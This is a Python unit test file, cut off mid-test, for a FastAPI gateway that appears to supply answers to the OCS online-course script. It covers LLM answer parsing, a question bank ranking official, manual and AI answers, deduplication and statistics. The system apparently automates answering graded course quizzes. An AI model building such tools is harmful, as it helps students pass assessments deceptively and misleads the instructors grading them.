"""网关的单元测试与接口测试。

运行：uv run python -m unittest discover -s tests -v
"""

from __future__ import annotations

import asyncio
import atexit
import io
import json
import os
import shutil
import sqlite3
import sys
import tempfile
import time
import unittest
import zipfile
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# 数据目录必须指向临时目录 —— 而且要在 import app.config **之前**设好：
# config.DATA_DIR 是模块导入时算出来的常量，事后改环境变量没用。
#
# 同理 BANK_DB_PATH：.env 里写的是相对路径 `data/bank.cleaned.db`，
# config 按 DATA_DIR 解析它。DATA_DIR 改名（临时目录）后，剥前缀那条规则
# 就不适用了，会解析成 <临时目录>/data/bank.cleaned.db —— 指向一个不存在的
# 文件。显式清空它，让它走 DATA_DIR/bank.db，语义明确、不依赖那条启发式。
#
# 不隔离会怎样（2026-11-10 实测）：测试的 setUp 只把 main.bank / main.progress 这些
# 单例指向临时目录，但 config.DATA_DIR 仍是生产目录，于是
#   - /api/restore 重建全局单例时用回 config.* 的生产路径，把生产 progress.json /
#     deadlines.json 当成临时文件覆盖掉；
#   - 每日任务把备份 zip 写进生产 data/backups/（一天攒出 190+ 个垃圾包）。
_TEST_DATA_DIR = tempfile.mkdtemp(prefix="ocs-gateway-test-")
os.environ["OCS_DATA_DIR"] = _TEST_DATA_DIR
os.environ["BANK_DB_PATH"] = ""  # 空 → 走 DATA_DIR/bank.db
atexit.register(shutil.rmtree, _TEST_DATA_DIR, True)

from fastapi.testclient import TestClient  # noqa: E402

from app import llm, main  # noqa: E402
from app.bank import Bank, hamming, simhash64, validate_item  # noqa: E402
from app.cache import AnswerCache  # noqa: E402
from app.llm import ProviderError  # noqa: E402
from app.parsing import build_messages, normalize_type, parse_answer, parse_options  # noqa: E402
from app.store import ProviderStore  # noqa: E402


class ParsingTests(unittest.TestCase):
    def test_normalize_type(self):
        self.assertEqual(normalize_type("single"), "single")
        self.assertEqual(normalize_type("Multiple"), "multiple")
        self.assertEqual(normalize_type("judgement"), "judge")
        self.assertEqual(normalize_type("tf"), "judge")
        self.assertEqual(normalize_type(None), "single")
        self.assertEqual(normalize_type("completion"), "completion")
        self.assertIsNone(normalize_type("essay"))

    def test_parse_options(self):
        self.assertEqual(parse_options('["北京","上海"]'), ["北京", "上海"])
        self.assertEqual(parse_options(["A", "B"]), ["A", "B"])
        self.assertEqual(parse_options("A. 北京\nB. 上海"), ["北京", "上海"])
        self.assertEqual(parse_options(""), [])

    def test_single(self):
        options = ["北京", "上海", "广州"]
        self.assertEqual(parse_answer("single", '{"answer": "B"}', options), "B")
        self.assertEqual(parse_answer("single", "答案：C。", options), "C")
        self.assertEqual(parse_answer("single", "B. 上海", options), "B")
        self.assertEqual(parse_answer("single", "上海", options), "B")
        self.assertIsNone(parse_answer("single", "不知道", options))
        self.assertIsNone(parse_answer("single", '{"answer": "Z"}', options))

    def test_multiple(self):
        options = ["甲", "乙", "丙", "丁"]
        self.assertEqual(parse_answer("multiple", '{"answer":"A#C"}', options), "A#C")
        self.assertEqual(parse_answer("multiple", "A、C、D", options), "A#C#D")
        self.assertEqual(parse_answer("multiple", "C,A", options), "A#C")
        self.assertIsNone(parse_answer("multiple", "都不对", options))

    def test_answer_letters_map_by_value_not_position(self):
        """答案字母按「字母的值」当下标，不是按它在答案串里的位置。

        回归 2026-11-10：核对脚本误用 ``enumerate(答案串)`` 取下标，
        把 "AC" 里的 C 当成第 2 个选项（实际是第 3 个）—— 45 条官方记录
        因此被误判成「答案与快照真值不符」。官方脚本的
        ``charCodeAt(0) - 65`` 是同一类错误的另一种表现。

        这里锁住网关自己的解析：多选 "AC" 必须是 A 和 C，不是 A 和 B。
        """
        options = ["甲", "乙", "丙", "丁", "戊"]
        self.assertEqual(parse_answer("multiple", "AC", options), "A#C")
        self.assertEqual(parse_answer("multiple", '{"answer":"AC"}', options), "A#C")
        self.assertEqual(parse_answer("multiple", "BD", options), "B#D")
        self.assertEqual(parse_answer("multiple", "C", options), "C")
        # 单选同理：字母的值决定选第几个
        self.assertEqual(parse_answer("single", "C", options), "C")
        self.assertEqual(parse_answer("single", "E", options), "E")

    def test_judge(self):
        self.assertEqual(parse_answer("judge", '{"answer":"正确"}', []), "正确")
        self.assertEqual(parse_answer("judge", "错误", []), "错误")
        self.assertEqual(parse_answer("judge", "不正确", []), "错误")
        self.assertEqual(parse_answer("judge", "√", []), "正确")
        self.assertEqual(parse_answer("judge", "A", ["正确", "错误"]), "正确")
        self.assertIsNone(parse_answer("judge", "可能吧", []))


    def test_completion(self):
        self.assertEqual(normalize_type("completion"), "completion")
        self.assertEqual(normalize_type("填空"), "completion")
        self.assertEqual(parse_answer("completion", '{"answer":"42"}', []), "42")
        self.assertEqual(parse_answer("completion", "答案：光合作用", []), "光合作用")
        self.assertIsNone(parse_answer("completion", "", []))

    def test_completion_answer_normalization(self):
        self.assertEqual(parse_answer("completion", '{"answer":"$12$"}', []), "12")
        self.assertEqual(parse_answer("completion", "答案： 2.0", []), "2")
        self.assertEqual(parse_answer("completion", "```\n2\n```", []), "2")
        self.assertEqual(parse_answer("completion", '{"answer":"2#3"}', []), "2#3")

    def test_completion_options_are_dropped(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "completion", "title": "填空占位选项", "options": ["请输入答案"], "answer": "1"})
            self.assertEqual(item["options"], [])

    def test_strict_parsing_rejects_unstructured_and_refusals(self):
        # 严格模式：只认 JSON 的 answer 或显式“答案：”行，不再把整段输出当答案
        self.assertEqual(parse_answer("completion", '{"answer":"42"}', [], strict=True), "42")
        self.assertEqual(parse_answer("completion", "答案：42", [], strict=True), "42")
        self.assertIsNone(parse_answer("completion", "推导过程\n所以答案是 42", [], strict=True))
        self.assertIsNone(parse_answer("completion", "抱歉，我无法查看图片内容", [], strict=True))
        self.assertIsNone(parse_answer("completion", "无法确定", [], strict=True))
        self.assertIsNone(parse_answer("completion", '{"answer":""}', [], strict=True))
        self.assertIsNone(parse_answer("single", "B. 上海", ["北京", "上海"], strict=True))
        # 推理里出现示例 JSON 时，取最后一个（最终答案）
        self.assertEqual(
            parse_answer("completion", '示例 {"answer":"示例"}，最终 {"answer":"42"}', [], strict=True),
            "42",
        )

    def test_plain_parsing_filters_refusals(self):
        self.assertIsNone(parse_answer("completion", "抱歉，我无法查看图片内容", []))
        self.assertIsNone(parse_answer("completion", "信息不足，请提供题目截图", []))
        # 非严格模式仍保留旧的整段兜底能力
        self.assertEqual(parse_answer("completion", "```\n2\n```", []), "2")

    def test_completion_prompt_allows_derivation(self):
        messages = build_messages("completion", "求行列式", [])
        self.assertIn("推导", messages[0]["content"])
        self.assertIn("行列式", messages[1]["content"])

    def test_build_messages_images(self):
        messages = build_messages("single", "看图 https://a/1.png", ["甲", "乙"], ["data:image/png;base64,AAA"])
        content = messages[1]["content"]
        self.assertIsInstance(content, list)
        self.assertEqual(content[0]["type"], "text")
        self.assertIn("[图片N]", content[0]["text"])
        self.assertEqual(content[1]["type"], "image_url")
        self.assertEqual(content[1]["image_url"]["url"], "data:image/png;base64,AAA")


class NoProxyTests(unittest.TestCase):
    def test_sanitize_strips_bracket_entries(self):
        from app import llm

        old = os.environ.get("NO_PROXY")
        try:
            os.environ["NO_PROXY"] = "localhost,[::1],127.0.0.1"
            llm._sanitize_no_proxy()
            self.assertEqual(os.environ["NO_PROXY"], "localhost,127.0.0.1")
        finally:
            if old is None:
                os.environ.pop("NO_PROXY", None)
            else:
                os.environ["NO_PROXY"] = old


class StatsTests(unittest.TestCase):
    def test_stats_persist_across_restart(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "stats.json")
            stats = main.Stats(path)
            stats.bump("total", 3)
            stats.bump("cached", 2)
            stats.bump("errors", 1)
            reloaded = main.Stats(path)
            self.assertEqual((reloaded.total, reloaded.cached, reloaded.errors), (3, 2, 1))
            self.assertEqual(reloaded.failovers, 0)

    def test_stats_persist_official_disputes(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "stats.json")
            stats = main.Stats(path)
            stats.bump("official_checked", 2)
            stats.bump("official_disputed")
            stats.bump("official_overridden")
            stats.mark_official_dispute("q1", "正确", "错误")
            reloaded = main.Stats(path)
            self.assertEqual(reloaded.official_checked, 2)
            self.assertEqual(reloaded.official_disputed, 1)
            self.assertEqual(reloaded.official_overridden, 1)
            self.assertTrue(reloaded.is_official_disputed("q1", "正确"))
            self.assertFalse(reloaded.is_official_disputed("q1", "错误"))
            self.assertEqual(reloaded.quality_snapshot()["official"],
                             {"checked": 2, "disputed": 1, "overridden": 1})

    def test_stats_reset_when_provider_model_changes(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "stats.json")
            stats = main.Stats(path)
            old = {"id": "p1", "name": "1", "model": "old-model"}
            stats.failure(old, "boom")
            stats.failure(old, "boom")
            self.assertEqual(stats.per["p1"]["calls"], 2)
            self.assertEqual(stats.per["p1"]["fails"], 2)
            self.assertEqual(stats.per["p1"]["model"], "old-model")

            # 同一 id 原地换模型：旧失败率必须清零，否则新模型会被
            # _unit_ready 的「失败率过半」规则永久排除。
            new = {"id": "p1", "name": "1", "model": "new-model"}
            stats.success(new, 100)
            self.assertEqual(stats.per["p1"]["calls"], 1)
            self.assertEqual(stats.per["p1"]["fails"], 0)
            self.assertEqual(stats.per["p1"]["model"], "new-model")

            # 旧数据没有 model 字段时不清零，避免升级后误删历史统计
            stats.per["p2"] = {"calls": 5, "fails": 3}
            stats.success({"id": "p2", "name": "2", "model": "m"}, 10)
            self.assertEqual(stats.per["p2"]["calls"], 6)
            self.assertEqual(stats.per["p2"]["fails"], 3)
            self.assertEqual(stats.per["p2"]["model"], "m")


class SubjectRulesTests(unittest.TestCase):
    def test_infer(self):
        with tempfile.TemporaryDirectory() as tmp:
            rules = main.SubjectRules(os.path.join(tmp, "subjects.json"))
            self.assertEqual(rules.infer("计算下列行列式的值", [])[0], "线性代数")
            self.assertEqual(rules.infer("CPU 的寻址方式", ["寄存器", "指令"])[0], "计算机组成原理")
            self.assertEqual(rules.infer("今天天气不错", [])[0], "")


class BankTests(unittest.TestCase):
    def test_validate_ok(self):
        self.assertIsNone(validate_item({"type": "single", "title": "首都是", "options": ["北京", "上海"], "answer": "A"}))
        self.assertIsNone(validate_item({"type": "multiple", "title": "偶数", "options": ["1", "2", "3", "4"], "answer": "B#D"}))
        self.assertIsNone(validate_item({"type": "judge", "title": "地球是圆的", "options": [], "answer": "正确"}))
        self.assertIsNone(validate_item({"type": "completion", "title": "1+1=__", "options": [], "answer": "2"}))

    def test_validate_rejects(self):
        self.assertIsNotNone(validate_item({"type": "essay", "title": "简答", "answer": "x"}))
        self.assertIsNotNone(validate_item({"type": "single", "title": "", "options": ["a", "b"], "answer": "A"}))
        self.assertIsNotNone(validate_item({"type": "single", "title": "t", "options": ["a"], "answer": "A"}))
        self.assertIsNotNone(validate_item({"type": "single", "title": "t", "options": ["a", "b"], "answer": "Z"}))
        self.assertIsNotNone(validate_item({"type": "single", "title": "t", "options": ["a", "b"], "answer": "北京"}))
        self.assertIsNotNone(validate_item({"type": "multiple", "title": "t", "options": ["a", "b", "c"], "answer": "AC"}))
        self.assertIsNotNone(validate_item({"type": "judge", "title": "t", "options": [], "answer": "对"}))

    def test_record_attempt_respects_allow_adopt(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "judge", "title": "待确认题", "options": ["对", "错"],
                             "answer": "正确", "source": "ai", "status": "pending"})
            for _ in range(3):
                bank.record_attempt(item["id"], "正确", allow_adopt=False)
            saved = bank.find_exact("judge", "待确认题", ["对", "错"])
            self.assertEqual(saved["status"], "pending")
            self.assertEqual(saved["agree"], 3)
            bank.record_attempt(item["id"], "正确", allow_adopt=True)
            self.assertEqual(bank.find_exact("judge", "待确认题", ["对", "错"])["status"], "adopted")

    def test_official_answer_crosses_subjects(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "地球是圆的", "options": ["对", "错"],
                      "answer": "正确", "subject": "默认", "source": "official", "status": "adopted"})
            hit = bank.find_official("judge", "地球是圆的", ["对", "错"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["subject"], "默认")
            bank.add({"type": "judge", "title": "太阳从西边升起", "options": ["对", "错"],
                      "answer": "错误", "subject": "默认", "source": "calibrated", "status": "adopted"})
            self.assertIsNone(bank.find_official("judge", "太阳从西边升起", ["对", "错"]))

    def test_pending_official_does_not_outrank_adopted(self):
        """official+pending 不是权威答案，match 必须优先返回 adopted 的记录。

        回归：_source_level 曾对 official 无条件返回 4，pending 的官方记录
        在 match 排序里压过已采纳的校准答案 —— 好答案被挤掉，请求转去重问 AI。
        """
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "同一道判断题", "options": ["对", "错"],
                      "answer": "正确", "subject": "默认",
                      "source": "official", "status": "pending"})
            adopted = bank.add({"type": "judge", "title": "同一道判断题", "options": ["对", "错"],
                                "answer": "错误", "subject": "默认",
                                "source": "calibrated", "status": "adopted"})
            # 哈希精确命中分支（_fast_lookup / _rank_item）
            hit = bank.match("judge", "同一道判断题", ["对", "错"], "默认")
            self.assertIsNotNone(hit)
            self.assertEqual(hit["id"], adopted["id"])
            self.assertEqual(hit["answer"], "错误")

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            stored = "判断下列说法是否正确并说明理由这是一道测试题"
            bank.add({"type": "judge", "title": stored, "options": ["对", "错"],
                      "answer": "正确", "subject": "默认",
                      "source": "official", "status": "pending"})
            adopted = bank.add({"type": "judge", "title": stored, "options": ["对", "错"],
                                "answer": "错误", "subject": "默认",
                                "source": "calibrated", "status": "adopted"})
            # 相似度全表扫描分支（match 的 rank 元组）
            hit = bank.match("judge", stored + "啊", ["对", "错"], "默认")
            self.assertIsNotNone(hit)
            self.assertEqual(hit["id"], adopted["id"])

    def test_pending_official_not_used_by_find_official(self):
        """find_official 只认 adopted 的官方答案；pending 官方宁可返回 None。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "待确认官方题", "options": ["对", "错"],
                      "answer": "正确", "subject": "默认",
                      "source": "official", "status": "pending"})
            self.assertIsNone(bank.find_official("judge", "待确认官方题", ["对", "错"]))

    def test_image_hash_missing_falls_back_to_text(self):
        """OCS 同一题有时带图、有时把图片 URL 写进题干，指纹缺失时按文本命中。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            title = "设 http://x/a.png 为三阶方阵，求行列式的值"
            bank.add({"type": "single", "title": title, "options": ["36", "72", "108", "1"],
                      "answer": "B", "source": "official", "status": "adopted"})
            hit = bank.find_official("single", title, ["36", "72", "108", "1"], "abc123")
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "B")
            self.assertEqual(bank.find_exact(
                "single", title, ["36", "72", "108", "1"], image_hash="abc123"
            )["answer"], "B")
            match = bank.match("single", title, ["36", "72", "108", "1"], image_hash="abc123")
            self.assertIsNotNone(match)
            self.assertEqual(match["answer"], "B")
            # 题干不同则不能靠“缺指纹”蹭答案
            self.assertIsNone(bank.find_official(
                "single", "设 http://x/b.png 为三阶方阵，求行列式的值",
                ["36", "72", "108", "1"], "abc123",
            ))

    def test_official_wins_over_ai_when_request_title_truncated(self):
        """请求题干被截短时：官方完整题干匹配不上，AI 记录不得抢走答案。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            full = ("设 http://x/a.png 为三阶方阵， http://x/b.png 将 http://x/c.png 按列分块为 "
                    "http://x/d.png , 则行列式 http://x/e.png 的值为")
            truncated = full[:120]  # 模拟请求侧题干被截短
            bank.add({"type": "completion", "title": full, "answer": "6",
                      "source": "official", "status": "adopted"})
            bank.add({"type": "completion", "title": truncated, "answer": "4",
                      "source": "ai", "status": "adopted", "agree": 2})
            hit = bank.find_official("completion", truncated, [])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "6")
            match = bank.match("completion", truncated, [], "默认")
            self.assertIsNotNone(match)
            self.assertEqual(match["answer"], "6")
            self.assertEqual(match["source"], "official")

    def test_truncated_match_requires_same_image_urls(self):
        """文字相同但图片 URL 不同的两道题，不能当成同一道题。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            stored = "设 http://x/a.png 为三阶方阵，求行列式的值"
            other = "设 http://x/other.png 为三阶方阵，求行列式的值"
            bank.add({"type": "single", "title": stored, "options": ["36", "72", "108", "1"],
                      "answer": "B", "source": "official", "status": "adopted"})
            self.assertIsNone(bank.find_official(
                "single", other, ["36", "72", "108", "1"],
            ))

    def test_ai_cannot_overwrite_manual_or_import(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            manual = bank.add({"type": "judge", "title": "人工答案题", "options": ["对", "错"],
                               "answer": "正确", "source": "manual", "status": "adopted"})
            imported = bank.add({"type": "judge", "title": "导入答案题", "options": ["对", "错"],
                                 "answer": "正确", "source": "import", "status": "adopted"})
            # 单次作答与校准都不能覆盖人工/导入答案
            self.assertEqual(bank.record_attempt(manual["id"], "错误", source="ai")["answer"], "正确")
            self.assertEqual(bank.record_attempt(imported["id"], "错误", source="calibrated")["answer"], "正确")
            bank.upsert_calibrated("judge", "人工答案题", ["对", "错"], "错误", source="ai")
            bank.upsert_calibrated("judge", "导入答案题", ["对", "错"], "错误", source="calibrated")
            saved_manual = bank.find_exact("judge", "人工答案题", ["对", "错"])
            saved_imported = bank.find_exact("judge", "导入答案题", ["对", "错"])
            self.assertEqual((saved_manual["answer"], saved_manual["source"]), ("正确", "manual"))
            self.assertEqual((saved_imported["answer"], saved_imported["source"]), ("正确", "import"))

    def test_official_can_overwrite_manual(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "人工待覆盖题", "options": ["对", "错"],
                      "answer": "正确", "source": "manual", "status": "adopted"})
            bank.upsert_calibrated("judge", "人工待覆盖题", ["对", "错"], "错误",
                                   source="official", adopted=True)
            saved = bank.find_exact("judge", "人工待覆盖题", ["对", "错"])
            self.assertEqual((saved["answer"], saved["source"], saved["status"]),
                             ("错误", "official", "adopted"))

    def test_manual_edit_can_correct_official(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "judge", "title": "官方待修正题", "options": ["对", "错"],
                             "answer": "正确", "source": "official", "status": "adopted"})
            updated = bank.update(item["id"], {"answer": "错误", "source": "manual"})
            self.assertEqual((updated["answer"], updated["source"], updated["status"]),
                             ("错误", "manual", "adopted"))

    def test_ai_can_refill_manual_item_after_mark_wrong(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "judge", "title": "人工错题", "options": ["对", "错"],
                             "answer": "正确", "source": "manual", "status": "adopted"})
            bank.mark_wrong(item["id"])
            refilled = bank.record_attempt(item["id"], "错误", source="ai")
            self.assertEqual((refilled["answer"], refilled["source"], refilled["status"]),
                             ("错误", "ai", "pending"))

    def test_answer_mismatch_detects_changed_option_content(self):
        """答案指向的选项内容消失时，要能识别成「答案与选项不匹配」。

        对应官方脚本（OCS 5.4.0）的黄条提示「⚠️ 给出的答案和选项不匹配」。
        注意**选项顺序变化不算不匹配** —— OCS 每次出卷都会重排选项。
        """
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "题库题", "options": ["北京", "上海"],
                      "answer": "A", "source": "official", "status": "adopted"})
            # 选项没变 → 不是不匹配
            self.assertIsNone(bank.find_answer_mismatch("single", "题库题", ["北京", "上海"]))
            # 选项只是重排 → 不是不匹配
            self.assertIsNone(bank.find_answer_mismatch("single", "题库题", ["上海", "北京"]))
            # 选项文字被改过（答案指向的内容消失了）→ 是不匹配
            hit = bank.find_answer_mismatch("single", "题库题", ["广州", "上海"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "A")
            # 别的题 → 不是不匹配
            self.assertIsNone(bank.find_answer_mismatch("single", "另一道题", ["广州", "上海"]))

    def test_classify_mismatch_distinguishes_kinds(self):
        """答案用不上时要分清原因，OCS 侧才能显示准确的告警。

        官方脚本（v5.4.0）的黄条文案是「⚠️ 给出的答案和选项不匹配」，
        但触发条件写反了（只在"没解析出答案"时显示）。我们分三类报。
        """
        from app.bank import classify_mismatch
        # 正常：什么都不报
        self.assertIsNone(classify_mismatch("single", "A", ["北京", "上海"]))
        self.assertIsNone(classify_mismatch("multiple", "A#C", ["甲", "乙", "丙"]))
        self.assertIsNone(classify_mismatch("judge", "正确", ["正确", "错误"]))
        # 答案指不到选项
        self.assertEqual(
            classify_mismatch("single", "C", ["北京", "上海"])["kind"],
            "answer-not-in-options",
        )
        self.assertEqual(
            classify_mismatch("multiple", "A#D", ["甲", "乙", "丙"])["kind"],
            "answer-not-in-options",
        )
        # 选项本身坏
        self.assertEqual(
            classify_mismatch("single", "A", ["", "上海"])["kind"], "broken-options")
        self.assertEqual(
            classify_mismatch("single", "A", ["北京", "北京"])["kind"], "broken-options")
        # 答案格式不合法
        self.assertEqual(
            classify_mismatch("judge", "也许吧", ["正确", "错误"])["kind"],
            "invalid-format",
        )

    def test_stored_title_with_flattened_image_still_matches(self):
        """库存里图被压成空括号的记录，也要能匹配上带图的请求。

        回归 2026-11-10：早期结果页解析器把图片 URL 抹掉，库存里留下
        ``则P( )= （ ）`` 这种形状。这类记录 has_image 为 False，
        原本会被 same_question_truncated 直接拒掉 —— 于是「官方答案 B」
        的记录匹配不上带图请求，反倒让一条 calibrated 的错误答案 C 顶上来。
        """
        from app.shape_key import same_question_truncated
        request = ("事件 A 与B 互不相容 , 若P(A)=0.2 ，P(B)=0.6,则P( "
                   "http://mooc-image.nosdn.127.net/_PhotoUploadUtils_da4f9477.png")
        stored = "事件 A 与B 互不相容 , 若P(A)=0.2 ，P(B)=0.6,则P( )= （ ）."
        self.assertTrue(
            same_question_truncated(request, stored),
            "图被压成空括号的库存记录不该被拒",
        )
        # 文字不同 → 仍然不认（别把「文字相同但图不同」的两道题混为一谈）
        self.assertFalse(same_question_truncated(request, "完全不同的另一道题"))

    def test_option_label_prefix_is_ignored_when_matching(self):
        """选项里带 ``A.`` ``B、`` ``(C)`` 标签时要能和裸内容对上。

        OCS 有些页面把字母标签一起塞进选项文本；官方脚本的 ``removeRedundant``
        会先剥掉再比对。我们不剥的话，同一道题在答题页和题库里成了两条记录。
        """
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "首都选择题", "options": ["北京", "上海"],
                      "answer": "A", "source": "official", "status": "adopted"})
            hit = bank.find_exact("single", "首都选择题", ["A. 北京", "B. 上海"])
            self.assertIsNotNone(hit, "带字母标签的选项没匹配上裸内容")
            self.assertEqual(hit["answer"], "A")

    def test_option_label_stripping_keeps_ambiguous_options(self):
        """剥前缀不能把 ``A`` 这类单字母选项吃掉，也不能误伤 ``A型``。"""
        from app.bank import _norm_option
        self.assertEqual(_norm_option("A"), "a")
        self.assertEqual(_norm_option("A型选择题"), "a型选择题")
        self.assertEqual(_norm_option("2024. 北京"), "2024北京")
        self.assertEqual(_norm_option("北京"), "北京")

    def test_dedupe_keeps_manual_answer_adopted(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            manual = bank.add({"type": "judge", "title": "人工冲突题", "options": ["对", "错"],
                               "answer": "正确", "source": "manual", "status": "adopted"})
            ai_item = bank.add({"type": "judge", "title": "人工冲突题", "options": ["对", "错"],
                                "answer": "错误", "source": "ai", "status": "adopted"})
            bank.dedupe(dry_run=False)
            self.assertEqual(bank.find_by_id(manual["id"])["status"], "adopted")
            self.assertEqual(bank.find_by_id(ai_item["id"])["status"], "pending")

    def test_dedupe_keeps_official_image_questions_apart(self):
        """题干文字相同、公式图不同的题不能被当成重复删掉。

        回归 2026-11-10 的事故：题干里的图片 URL 被归一化抹成 ``http//edu-ima``
        残片，导致「设 http://…9ac47dce」和「设 http://…6d486bc1」归到同一组，
        ``dedupe_near`` 一轮删掉 300 条，其中 6 条是官方答案。
        """
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            first = bank.add({
                "type": "judge",
                "title": "设 http://edu-image.nosdn.127.net/_PhotoUploadUtils_9ac47dce-deba-4c06-9.png",
                "options": ["对", "错"], "answer": "正确",
                "source": "official", "status": "adopted",
            })
            second = bank.add({
                "type": "judge",
                "title": "设 http://edu-image.nosdn.127.net/_PhotoUploadUtils_6d486bc1-1442-482d.png",
                "options": ["对", "错"], "answer": "错误",
                "source": "official", "status": "adopted",
            })
            bank.dedupe(dry_run=False)
            bank.dedupe_near(max_distance=3, dry_run=False)
            self.assertIsNotNone(bank.find_by_id(first["id"]), "图不同的官方题被误删")
            self.assertIsNotNone(bank.find_by_id(second["id"]), "图不同的官方题被误删")
            self.assertEqual(len(bank.all()), 2)

    def test_dedupe_near_does_not_drop_official_answers(self):
        """纯文字题即使判成近似重复，官方答案也不能丢。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            official = bank.add({"type": "judge", "title": "甲、乙两人约定在下午4到5点间在某地相见。",
                                 "options": ["对", "错"], "answer": "正确",
                                 "source": "official", "status": "adopted"})
            ai_item = bank.add({"type": "judge", "title": "甲、乙两人约定在下午4到5点间在某地相见。",
                                "options": ["对", "错"], "answer": "正确",
                                "source": "ai", "status": "pending"})
            bank.dedupe(dry_run=False)
            bank.dedupe_near(max_distance=3, dry_run=False)
            kept = bank.find_by_id(official["id"])
            self.assertIsNotNone(kept, "官方答案记录被删")
            self.assertEqual(kept["answer"], "正确")
            # 被合并掉的应是低优先级那条，答案要落到留存记录上
            self.assertEqual(len(bank.all()), 1)
            self.assertEqual(bank.all()[0]["answer"], "正确")
            self.assertIsNone(bank.find_by_id(ai_item["id"]))

    def test_bank_does_not_overwrite_broken_db_with_stale_json(self):
        """库坏掉时不能用陈旧的 bank.json 覆盖它。

        回归 2026-11-10：``Bank._load()`` 在 db 读不出记录时，会拿 bank.json
        回填 db —— 库损坏 + 陈旧 json = 真实数据被二次抹掉（1224 条 → 777 条）。
        """
        with tempfile.TemporaryDirectory() as tmp:
            json_path = os.path.join(tmp, "bank.json")
            db_path = os.path.join(tmp, "bank.json.db")
            # 先做一份「陈旧 json」：只有 1 条，且比库里旧
            with open(json_path, "w", encoding="utf-8") as fp:
                json.dump({"items": [{
                    "id": "stale01", "type": "judge", "title": "陈旧条目",
                    "options": ["对", "错"], "answer": "正确", "subject": "默认",
                    "image_hash": "", "sh": "", "source": "official", "level": 4,
                    "via": "", "status": "adopted", "history": [],
                    "wrong_answers": [], "agree": 2, "conflict": False,
                    "created": 1.0, "official_via": "",
                }]}, fp, ensure_ascii=False)
            # 造一个损坏的 db（有表但内容读不出来）
            conn = sqlite3.connect(db_path)
            conn.execute("CREATE TABLE questions (id TEXT PRIMARY KEY, type TEXT, title TEXT)")
            conn.commit()
            conn.close()
            with open(db_path, "r+b") as fp:
                fp.seek(0)
                fp.write(b"\x00" * 4096)  # 破坏头部页
            bank = Bank(json_path, db_path)
            try:
                self.assertTrue(bank._load_failed, "库坏了却没标记 _load_failed")
                self.assertEqual(len(bank.all()), 0, "不该把陈旧 json 灌进坏库")
            finally:
                bank.close()

    def test_update_marks_answer_change_as_manual(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "judge", "title": "AI 待修订题", "options": ["对", "错"],
                             "answer": "正确", "source": "ai", "status": "adopted"})
            updated = bank.update(item["id"], {"answer": "错误"})
            self.assertEqual((updated["answer"], updated["source"], updated["status"]),
                             ("错误", "manual", "adopted"))
            self.assertEqual(len(updated["history"]), 1)

    def test_update_cannot_downgrade_manual_with_ai_source(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "judge", "title": "人工保护题", "options": ["对", "错"],
                             "answer": "正确", "source": "manual", "status": "adopted"})
            bank.update(item["id"], {"answer": "错误", "source": "ai"})
            saved = bank.find_by_id(item["id"])
            self.assertEqual((saved["answer"], saved["source"], saved["status"]),
                             ("正确", "manual", "adopted"))

    def test_promote_and_import_keep_intended_source(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            pending = bank.add({"type": "judge", "title": "待采纳题", "options": ["对", "错"],
                                "answer": "正确", "source": "ai", "status": "pending"})
            promoted = bank.promote(pending["id"])
            self.assertEqual((promoted["status"], promoted["source"]), ("adopted", "manual"))
            imported = bank.add({"type": "judge", "title": "导入保留题", "options": ["对", "错"],
                                 "answer": "正确", "source": "import", "status": "adopted"})
            self.assertEqual(imported["source"], "import")

    def test_bank_dedupe_demotes_conflicts(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "有争议的题", "options": ["对", "错"],
                      "answer": "正确", "source": "calibrated", "status": "adopted"})
            bank.add({"type": "judge", "title": "有争议的题", "options": ["对", "错"],
